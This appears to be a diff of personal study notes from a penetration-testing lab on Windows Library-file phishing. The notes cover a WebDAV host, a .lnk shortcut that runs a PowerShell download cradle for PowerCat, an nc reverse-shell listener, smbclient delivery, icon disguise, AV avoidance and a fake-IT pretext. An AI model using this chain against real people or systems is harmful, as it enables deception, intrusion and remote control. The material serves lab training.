@@ -19,7 +19,7 @@ tags:
 > | Library file name/icon | Use DLL+index references (`@windows.storage.dll,-34582`, `imageres.dll,-1003`) — never a raw string |
 > | Reset gotcha | Windows auto-rewrites the `url` tag + adds a `serialized` tag after first use — repaste the original XML before resending |
 > | Stage 2 payload | `.lnk` shortcut on the WebDAV share, target = PowerShell download cradle + PowerCat |
-> | Delivery in this lab | `smbclient //<target>/share -c 'put config.Library-ms'` |
+> | Delivery in this lab | `smbclient //<target>/share -N -c 'put config.Library-ms'` (`-N` = anonymous; omit and it tries your Kali username) |
 
 ## Visual Flow
 
@@ -63,9 +63,15 @@ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
 
 Confirm it's up by browsing to `http://127.0.0.1` — `test.txt` should be visible.
 
+> [!danger] "Permission denied" or "Address already in use" on port 80
+> Binding to port 80 requires root — run `wsgidav` with `sudo`, or it'll fail with a permission error. If something else is already bound to 80 (a leftover `python3 -m http.server`, Apache, etc.), `wsgidav` fails to start instead — `sudo ss -lntp | grep :80` to find and kill the culprit, or pick a different `--port` and update the `url` value in the XML (below) to match.
+
 ## Building the library file's XML
 
 RDP into the build VM (`xfreerdp /v:<CLIENT-IP> /u:offsec /p:lab`) and open **Visual Studio Code** (Notepad also works). `File → New Text File → Save As → config.Library-ms` on the desktop.
+
+> [!tip] Pasting the XML in — enable clipboard sharing
+> The XML snippets below are meant to be copy-pasted from Kali straight into the RDP session. Add `/clipboard` to the `xfreerdp` command to sync the clipboard both ways; without it, paste inside the VM does nothing and you're stuck retyping XML by hand. If clipboard sharing still won't cooperate (some lab images block it), fall back to serving the XML as a `.txt` over `python3 -m http.server` and opening it in a browser inside the VM to copy from there instead.
 
 > [!warning] Saving with the extension alone changes the icon
 > The moment the file is saved as `.Library-ms`, Explorer assigns it a distinct icon — not overtly dangerous-looking, but also not one Windows uses commonly, which can itself raise suspicion. Worth deliberately overriding it (see `iconReference` below) to blend in.
@@ -166,9 +172,12 @@ Name the shortcut something benign, e.g. `automatic_configuration`, and finish t
 **On Kali**, before testing:
 
 ```bash
-python3 -m http.server 80    # serves powercat.ps1
-nc -nvlp 4444                 # catches the shell
+python3 -m http.server 8000    # serves powercat.ps1 — NOT port 80, wsgidav already owns it
+nc -nvlp 4444                   # catches the shell
 ```
+
+> [!warning] Port 80 is already taken by WsgiDAV
+> The `.lnk` payload's download cradle points at `:8000` (see the target command above) precisely because WsgiDAV from Stage 1 is already bound to port 80 on the same Kali box — trying to also run `python3 -m http.server 80` here fails with `OSError: [Errno 98] Address already in use`. Keep the web server port and the `DownloadString` URL's port in sync if you change either one.
 
 > [!info] Why not host PowerCat on the WebDAV share itself?
 > The WebDAV share is writable — hosting the payload there risks it getting scanned, quarantined, or removed by AV/security tooling. Locking the share to read-only would fix that, but at the cost of losing it as a channel for pulling files *off* target systems. A separate Python web server for payload hosting keeps both capabilities intact.
@@ -188,12 +197,12 @@ PS C:\Windows\System32\WindowsPowerShell\v1.0>
 ## Putting it together against a real target
 
 1. Copy `automatic_configuration.lnk` and the **reset** `config.Library-ms` into the Kali WebDAV directory (`/home/kali/webdav`), removing the leftover `test.txt` first.
-2. Start all three services on Kali: `wsgidav` (WebDAV), `python3 -m http.server 80` (PowerCat), `nc -nvlp 4444` (listener).
+2. Start all three services on Kali: `wsgidav` (WebDAV, port 80), `python3 -m http.server 8000` (PowerCat), `nc -nvlp 4444` (listener).
 3. Deliver `config.Library-ms` to the target. In this lab, delivery is simulated via an accessible SMB share instead of email:
    ```bash
    cd webdav
    rm test.txt
-   smbclient //<TARGET-IP>/share -c 'put config.Library-ms'
+   smbclient //<TARGET-IP>/share -N -c 'put config.Library-ms'
    ```
 4. The pretext matters as much as the payload — e.g. posing as new IT staff rolling out a "configuration tool," instructing the target to open the library file's folder and double-click the shortcut inside it.
 5. When the simulated user runs it, the listener catches the shell:
@@ -201,6 +210,9 @@ PS C:\Windows\System32\WindowsPowerShell\v1.0>
    PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
    hr137\hsmith
    ```
+
+> [!danger] `NT_STATUS_ACCESS_DENIED` on the smbclient upload
+> `smbclient` silently authenticates as **your local Kali username** if no credentials are given at all — it does *not* default to anonymous/guest. Running the bare command without `-N` or `-U` against a share that expects anonymous access (or a different valid account) fails with `NT_STATUS_ACCESS_DENIED` even though the share itself is reachable. Fix: pass `-N` explicitly for anonymous/null-session access (as above), or `-U <user>%<password>` if the share needs a specific account. Don't assume the connection is broken — check auth first.
 
 > [!tip] Chainable with other vectors
 > Nothing stops combining this with the Office macro technique from [[Leveraging Microsoft Word macros]] — e.g. a `.Library-ms` stage 1 delivering a weaponized document as stage 2 instead of a raw `.lnk`.
@@ -210,6 +222,8 @@ PS C:\Windows\System32\WindowsPowerShell\v1.0>
 > - Hosting the PowerCat payload directly on the writable WebDAV share, risking AV quarantine.
 > - Using a literal/arbitrary string for the `name` tag instead of a proper DLL+index reference.
 > - Not resetting/removing test files (`test.txt`) from the WebDAV root before it goes "live" against a real target.
+> - Running the PowerCat web server on port 80 alongside WsgiDAV — they collide; use a different port and keep it in sync with the `.lnk`'s download URL.
+> - Running `smbclient` without `-N`/`-U` — it tries your local Kali username, not anonymous, and fails with `NT_STATUS_ACCESS_DENIED`.
 
 > [!tip] Beginner note
 > `DavWWWRoot` is the internal name Windows' native WebDAV redirector uses once it recognizes a UNC path as a WebDAV connection — seeing `\\<ip>\DavWWWRoot` after Windows "optimizes" the library file is expected, not a sign anything broke by itself.
